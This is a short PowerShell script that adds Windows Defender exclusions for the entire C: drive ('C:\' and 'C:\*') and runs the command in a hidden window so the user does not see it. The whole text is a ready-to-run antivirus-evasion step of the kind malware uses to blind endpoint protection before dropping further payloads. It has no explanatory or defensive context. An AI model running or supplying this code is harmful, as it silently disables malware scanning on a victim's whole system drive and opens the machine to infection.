$yourCode = @'
$addExclusion = {param($p) Add-MpPreference -ExclusionPath $p -Force}
& $addExclusion "C:\"
& $addExclusion "C:\*"
Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
'@
 
Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -Command `"$yourCode`""
